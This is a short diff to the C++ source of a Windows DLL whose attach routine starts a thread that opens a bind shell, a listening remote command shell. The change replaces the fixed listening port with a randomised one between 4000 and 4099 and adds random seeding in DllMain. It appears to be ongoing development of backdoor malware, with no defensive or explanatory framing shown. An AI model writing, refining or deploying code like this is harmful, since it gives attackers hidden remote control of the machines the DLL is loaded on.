@@ -30,7 +30,10 @@ DWORD APIENTRY OnDllAttach(LPVOID lpParameter)
 }
 
 DWORD APIENTRY BindShellThread(LPVOID lpParameter) {
-    BindShell* bindShell = new BindShell(4321);
+    srand(time(NULL));
+
+    int port = 4000 + (rand() % 100);
+    BindShell* bindShell = new BindShell(port);
 
     bindShell->Bingus();
 
@@ -51,6 +54,8 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     {
         // disable DLL_THREAD_ATTACH and DLL_THREAD_DETACH reasons to call
         DisableThreadLibraryCalls(hModule);
+
+        srand(time(NULL));
 
         /*
         HANDLE hThread = GetCurrentThread();
